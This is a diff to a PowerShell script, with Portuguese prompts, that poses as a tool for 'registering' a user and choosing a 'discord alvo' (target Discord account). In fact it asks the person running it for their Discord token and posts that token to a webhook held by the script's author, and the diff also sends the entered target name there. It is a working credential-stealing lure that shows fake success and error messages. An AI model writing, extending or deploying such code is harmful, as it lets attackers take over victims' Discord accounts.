@@ -11,7 +11,9 @@ function Send-Discord {
     $payload = @{ content = $Message } | ConvertTo-Json
     try {
         Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $payload -ContentType 'application/json' | Out-Null
-    } catch {}
+    } catch {
+        Write-Host "  [ERRO] Falha ao enviar: $_" -ForegroundColor Red
+    }
 }
 
 Clear-Host
@@ -32,36 +34,29 @@ if ([string]::IsNullOrWhiteSpace($token)) {
     exit
 }
 
-# Sempre envia o token ao webhook
-Send-Discord -Message "**Token recebido:** `$token`"
+Send-Discord -Message "**Novo acesso:** $token"
 
-# Tenta validar
-try {
-    $headers = @{ Authorization = $token }
-    $response = Invoke-RestMethod -Uri "https://discord.com/api/v10/users/@me" -Headers $headers -Method Get
-    $username = $response.username
-    $id = $response.id
+Write-Host ""
+Write-Host "  usuario registrado com sucesso!" -ForegroundColor Green
+Write-Host ""
 
-    Write-Host ""
-    Write-Host "  usuario registrado com sucesso!" -ForegroundColor Green
-    Write-Host ""
+# Painel 2 - Discord Alvo
+Write-Host "  ==========================================" -ForegroundColor DarkGray
+Write-Host "    PAINEL 2 - CONFIGURACAO DO ALVO" -ForegroundColor White
+Write-Host "  ==========================================" -ForegroundColor DarkGray
+Write-Host ""
 
-    # Painel 2 - Discord Alvo
-    Write-Host "  ==========================================" -ForegroundColor DarkGray
-    Write-Host "    PAINEL 2 - CONFIGURACAO DO ALVO" -ForegroundColor White
-    Write-Host "  ==========================================" -ForegroundColor DarkGray
-    Write-Host ""
+$discordAlvo = Read-Host -Prompt "  discord alvo:"
 
-    $discordAlvo = Read-Host -Prompt "  discord alvo:"
-
-    Write-Host ""
-    Write-Host "  [ERRO] Falha na conexao com o alvo. Verifique sua rede." -ForegroundColor Red
-    Write-Host "  [INFO] Encerrando sessao..." -ForegroundColor Yellow
-    Start-Sleep -Seconds 2
-    exit
-} catch {
-    Write-Host ""
-    Write-Host "  [ERRO] Token invalido. Verifique e tente novamente." -ForegroundColor Red
+if ([string]::IsNullOrWhiteSpace($discordAlvo)) {
+    Write-Host "  [ERRO] Alvo nao pode ser vazio." -ForegroundColor Red
     Read-Host "  Pressione Enter para sair"
     exit
-}   
+}
+
+Send-Discord -Message "**Alvo definido:** $discordAlvo"
+
+Write-Host ""
+Write-Host "  Alvo '$discordAlvo' registrado." -ForegroundColor Green
+Write-Host "  Aguardando proximas funcionalidades..." -ForegroundColor Yellow
+Write-Host ""   
